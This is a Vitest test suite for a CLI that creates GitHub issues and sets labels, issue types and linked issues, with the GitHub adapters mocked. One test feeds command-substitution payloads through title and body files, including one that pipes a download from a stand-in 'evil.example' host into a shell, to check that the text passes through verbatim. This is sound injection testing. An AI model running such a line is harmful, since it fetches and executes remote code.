import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type * as ConfigHelpers from '../../shared/adapters/config-helpers'

process.env.GITHUB_REPO = 'Test/test-repo'

// Only GITHUB_REPO is stubbed — the resolvers are pure and are part of the
// contract under test (PR #528 review).
vi.mock('../../shared/adapters/config-helpers', async (importOriginal) => ({
  ...(await importOriginal<typeof ConfigHelpers>()),
  GITHUB_REPO: 'Test/test-repo',
}))

vi.mock('../../shared/adapters/github-infra', () => ({
  syncPriorityLabel: vi.fn(async () => true),
  syncSizeLabel: vi.fn(async () => true),
  syncLaneLabel: vi.fn(async () => true),
  syncStatusLabel: vi.fn(async () => true),
}))

vi.mock('../../shared/adapters/github-adapter', () => ({
  createGitHubIssue: vi.fn(),
  getNodeId: vi.fn(),
  addBlockedBy: vi.fn(),
  addSubIssue: vi.fn(),
  resolveIssueTypeId: vi.fn(),
  updateIssueIssueType: vi.fn(),
}))

const github = await import('../../shared/adapters/github-adapter')
const mockCreateGitHubIssue = github.createGitHubIssue as ReturnType<typeof vi.fn>
const mockGetNodeId = github.getNodeId as ReturnType<typeof vi.fn>
const mockAddBlockedBy = github.addBlockedBy as ReturnType<typeof vi.fn>
const mockAddSubIssue = github.addSubIssue as ReturnType<typeof vi.fn>

const githubInfra = await import('../../shared/adapters/github-infra')
const mockSyncPriorityLabel = githubInfra.syncPriorityLabel as ReturnType<typeof vi.fn>
const mockSyncSizeLabel = githubInfra.syncSizeLabel as ReturnType<typeof vi.fn>
const mockSyncLaneLabel = githubInfra.syncLaneLabel as ReturnType<typeof vi.fn>
const mockSyncStatusLabel = githubInfra.syncStatusLabel as ReturnType<typeof vi.fn>
const mockResolveIssueTypeId = github.resolveIssueTypeId as ReturnType<typeof vi.fn>
const mockUpdateIssueIssueType = github.updateIssueIssueType as ReturnType<typeof vi.fn>

const { createIssue } = await import('../lib/create')

function setupMocks() {
  vi.clearAllMocks()
  mockCreateGitHubIssue.mockResolvedValue({
    url: 'https://github.com/test/repo/issues/99',
    number: 99,
  })
  mockGetNodeId.mockImplementation(async (num) => `node-${num}`)
  mockResolveIssueTypeId.mockResolvedValue('issue-type-id')
  vi.spyOn(console, 'log').mockImplementation(() => {})
  vi.spyOn(console, 'error').mockImplementation(() => {})
}

describe('issue-triage/create > basic creation', () => {
  beforeEach(setupMocks)
  afterEach(() => vi.restoreAllMocks())

  it('creates an issue with title', async () => {
    await createIssue(['--title', 'Test issue'])
    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test issue', undefined, undefined)
    expect(console.log).toHaveBeenCalledWith(expect.stringContaining('Created #99'))
  })

  it('syncs size label on creation', async () => {
    await createIssue(['--title', 'Test', '--size', 'M'])
    expect(mockSyncSizeLabel).toHaveBeenCalledWith(99, 'F-lite')
  })

  it('syncs priority label on creation', async () => {
    await createIssue(['--title', 'Test', '--priority', 'High'])
    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P1 - High')
  })

  it('syncs status label on creation', async () => {
    await createIssue(['--title', 'Test', '--status', 'In Progress'])
    expect(mockSyncStatusLabel).toHaveBeenCalledWith(99, 'In Progress')
  })

  it('rejects an unrecognised priority before the issue is created', async () => {
    // Arrange — throw on exit so execution stops at the guard, as real process.exit would
    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code: number) => {
      throw new Error(`process.exit:${code}`)
    }) as never)
    const errors: string[] = []
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(String(args[0])))
    // Act
    await createIssue(['--title', 'Test', '--priority', 'P3-nope']).catch(() => {})
    // Assert — nothing written: no issue, no label, and no silent success
    expect(exitSpy).toHaveBeenCalledWith(1)
    expect(mockCreateGitHubIssue).not.toHaveBeenCalled()
    expect(mockSyncPriorityLabel).not.toHaveBeenCalled()
    expect(errors.some((m) => m.includes('Invalid priority'))).toBe(true)
  })

  it('accepts the label spelling the CLI itself writes', async () => {
    // The input the pre-#525 resolver rejects — without it this suite cannot
    // tell the two implementations apart (PR #528 review).
    await createIssue(['--title', 'Test', '--priority', 'P3-low'])
    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P3 - Low')
  })

  it('treats an empty --body as "no body" rather than a missing value', async () => {
    await createIssue(['--title', 'Test', '--body', ''])
    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test', '', undefined)
  })

  it('rejects a flag given no value before the issue is created', async () => {
    // Arrange
    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code: number) => {
      throw new Error(`process.exit:${code}`)
    }) as never)
    const errors: string[] = []
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(String(args[0])))
    // Act
    await createIssue(['--title', 'Test', '--priority', '']).catch(() => {})
    // Assert
    expect(exitSpy).toHaveBeenCalledWith(1)
    expect(mockCreateGitHubIssue).not.toHaveBeenCalled()
    expect(errors.some((m) => m.includes('--priority requires a value'))).toBe(true)
  })

  it('still reports the unwritten label when a relationship write throws', async () => {
    // Arrange — the report used to be a tail statement of the happy path, so
    // any throw from applyRelationships swallowed it (PR #528 review).
    mockSyncLaneLabel.mockResolvedValueOnce(false)
    mockAddSubIssue.mockRejectedValueOnce(new Error('gh: sub-issue add failed'))
    const errors: string[] = []
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(String(args[0])))
    // Act
    await createIssue(['--title', 'Test', '--lane', 'b', '--parent', '163']).catch(() => {})
    // Assert
    expect(errors.some((m) => m.includes('label not written for lane'))).toBe(true)
  })

  it('still links the parent when a label write fails, then exits 1', async () => {
    // Arrange — this repo carries no lane label, so syncLaneLabel returns false
    mockSyncLaneLabel.mockResolvedValueOnce(false)
    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code: number) => {
      throw new Error(`process.exit:${code}`)
    }) as never)
    // Act — the shape documented in README.md:38
    await createIssue(['--title', 'Test', '--lane', 'b', '--parent', '163']).catch(() => {})
    // Assert — the issue is created and linked; the failure is reported last
    expect(mockCreateGitHubIssue).toHaveBeenCalled()
    expect(mockAddSubIssue).toHaveBeenCalledWith('node-163', 'node-99')
    expect(exitSpy).toHaveBeenCalledWith(1)
  })
})

describe('issue-triage/create > title and body from files', () => {
  let dir: string
  beforeEach(() => {
    setupMocks()
    dir = mkdtempSync(path.join(tmpdir(), 'triage-create-'))
  })
  afterEach(() => {
    vi.restoreAllMocks()
    rmSync(dir, { recursive: true, force: true })
  })

  it('passes shell metacharacters through verbatim', async () => {
    // The text fix files comes from PR comments; on argv it would need shell
    // quoting, where $(…) and backticks still run.
    const title = path.join(dir, 'title.txt')
    const body = path.join(dir, 'body.md')
    writeFileSync(title, 'lockfile drift $(touch pwned)\n')
    writeFileSync(body, '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n')
    await createIssue(['--title-file', title, '--body-file', body])
    expect(mockCreateGitHubIssue).toHaveBeenCalledWith(
      'lockfile drift $(touch pwned)',
      '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n',
      undefined,
    )
  })

  it('refuses an unreadable body file before the issue is created', async () => {
    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code: number) => {
      throw new Error(`process.exit:${code}`)
    }) as never)
    const errors: string[] = []
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(String(args[0])))
    await createIssue(['--title', 'Test', '--body-file', path.join(dir, 'missing.md')]).catch(() => {})
    expect(exitSpy).toHaveBeenCalledWith(1)
    expect(mockCreateGitHubIssue).not.toHaveBeenCalled()
    expect(errors.some((m) => m.includes('--body-file cannot read'))).toBe(true)
  })
})

describe('issue-triage/create > relationships', () => {
  beforeEach(setupMocks)
  afterEach(() => vi.restoreAllMocks())

  it('sets parent relationship', async () => {
    await createIssue(['--title', 'Child', '--parent', '50'])
    expect(mockAddSubIssue).toHaveBeenCalledWith('node-50', 'node-99')
  })

  it('sets cross-repo parent relationship', async () => {
    await createIssue(['--title', 'Child', '--parent', 'Roxabi/lyra#100'])
    expect(mockGetNodeId).toHaveBeenCalledWith(100, 'Roxabi/lyra')
    expect(mockAddSubIssue).toHaveBeenCalledWith('node-100', 'node-99')
  })

  it('adds children', async () => {
    await createIssue(['--title', 'Epic', '--add-child', '60,61'])
    expect(mockAddSubIssue).toHaveBeenCalledWith('node-99', 'node-60')
    expect(mockAddSubIssue).toHaveBeenCalledWith('node-99', 'node-61')
  })

  it('adds cross-repo children', async () => {
    await createIssue(['--title', 'Epic', '--add-child', 'Roxabi/lyra#60'])
    expect(mockGetNodeId).toHaveBeenCalledWith(60, 'Roxabi/lyra')
    expect(mockAddSubIssue).toHaveBeenCalledWith('node-99', 'node-60')
  })

  it('sets blocked-by dependencies', async () => {
    await createIssue(['--title', 'Test', '--blocked-by', '10,11'])
    expect(mockAddBlockedBy).toHaveBeenCalledWith('node-99', 'node-10')
    expect(mockAddBlockedBy).toHaveBeenCalledWith('node-99', 'node-11')
  })

  it('sets cross-repo blocked-by dependencies', async () => {
    await createIssue(['--title', 'Test', '--blocked-by', 'Roxabi/lyra#728'])
    expect(mockGetNodeId).toHaveBeenCalledWith(728, 'Roxabi/lyra')
    expect(mockAddBlockedBy).toHaveBeenCalledWith('node-99', 'node-728')
    expect(console.log).toHaveBeenCalledWith(expect.stringContaining('Roxabi/lyra#728'))
  })

  it('sets blocking dependencies', async () => {
    await createIssue(['--title', 'Test', '--blocks', '20'])
    expect(mockAddBlockedBy).toHaveBeenCalledWith('node-20', 'node-99')
  })

  it('sets cross-repo blocking dependencies', async () => {
    await createIssue(['--title', 'Test', '--blocks', 'Roxabi/voiceCLI#94'])
    expect(mockGetNodeId).toHaveBeenCalledWith(94, 'Roxabi/voiceCLI')
    expect(mockAddBlockedBy).toHaveBeenCalledWith('node-94', 'node-99')
  })

  it('handles mixed local and cross-repo refs', async () => {
    await createIssue(['--title', 'Test', '--blocked-by', '10, Roxabi/lyra#728, #11'])
    expect(mockGetNodeId).toHaveBeenCalledWith(10, undefined)
    expect(mockGetNodeId).toHaveBeenCalledWith(728, 'Roxabi/lyra')
    expect(mockGetNodeId).toHaveBeenCalledWith(11, undefined)
    expect(mockAddBlockedBy).toHaveBeenCalledTimes(3)
  })
})

describe('issue-triage/create > options and error handling', () => {
  beforeEach(setupMocks)
  afterEach(() => vi.restoreAllMocks())

  it('includes labels in create call', async () => {
    await createIssue(['--title', 'Test', '--label', 'bug,frontend'])
    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test', undefined, ['bug', 'frontend'])
  })

  it('includes body in create call', async () => {
    await createIssue(['--title', 'Test', '--body', 'Description here'])
    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test', 'Description here', undefined)
  })

  it('exits 1 on invalid --size', async () => {
    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(((code?: number) => {
      throw new Error(`process.exit:${code}`)
    }) as never)
    const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
    await expect(createIssue(['--title', 'Test', '--size', 'bogus'])).rejects.toThrow('process.exit:1')
    expect(errSpy).toHaveBeenCalledWith(expect.stringContaining("Invalid size 'bogus'"))
    expect(mockSyncSizeLabel).not.toHaveBeenCalled()
    exitSpy.mockRestore()
    errSpy.mockRestore()
  })
})

describe('issue-triage/create > priority label sync', () => {
  beforeEach(setupMocks)
  afterEach(() => vi.restoreAllMocks())

  it('syncs priority label when --priority is provided', async () => {
    await createIssue(['--title', 'Test', '--priority', 'High'])
    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P1 - High')
  })

  it('does not sync priority label when --priority is not provided', async () => {
    await createIssue(['--title', 'Test'])
    expect(mockSyncPriorityLabel).not.toHaveBeenCalled()
  })

  it('syncs size label when --size is provided', async () => {
    await createIssue(['--title', 'Test', '--size', 'M'])
    expect(mockSyncSizeLabel).toHaveBeenCalledWith(99, 'F-lite')
  })

  it('syncs status label when --status is provided', async () => {
    await createIssue(['--title', 'Test', '--status', 'In Progress'])
    expect(mockSyncStatusLabel).toHaveBeenCalledWith(99, 'In Progress')
  })
})

describe('issue-triage/create > type', () => {
  beforeEach(setupMocks)
  afterEach(() => vi.restoreAllMocks())

  it('sets issue type on creation', async () => {
    await createIssue(['--title', 'Test', '--type', 'feat'])
    expect(mockResolveIssueTypeId).toHaveBeenCalledWith('Test', 'feat')
    expect(mockUpdateIssueIssueType).toHaveBeenCalledWith('node-99', 'issue-type-id')
  })

  it('accepts extended types (epic)', async () => {
    await createIssue(['--title', 'Test', '--type', 'epic'])
    expect(mockUpdateIssueIssueType).toHaveBeenCalledWith('node-99', 'issue-type-id')
  })

  it('normalizes type case', async () => {
    await createIssue(['--title', 'Test', '--type', 'FIX'])
    expect(mockResolveIssueTypeId).toHaveBeenCalledWith('Test', 'fix')
  })

  it('does not set type when --type is not provided', async () => {
    await createIssue(['--title', 'Test'])
    expect(mockUpdateIssueIssueType).not.toHaveBeenCalled()
  })
})

describe('issue-triage/create > lane', () => {
  beforeEach(setupMocks)
  afterEach(() => vi.restoreAllMocks())

  it('syncs lane label when --lane is provided', async () => {
    await createIssue(['--title', 'Test', '--lane', 'a1'])
    expect(mockSyncLaneLabel).toHaveBeenCalledWith(99, 'a1')
  })

  it('does not sync lane label when --lane is not provided', async () => {
    await createIssue(['--title', 'Test'])
    expect(mockSyncLaneLabel).not.toHaveBeenCalled()
  })
})
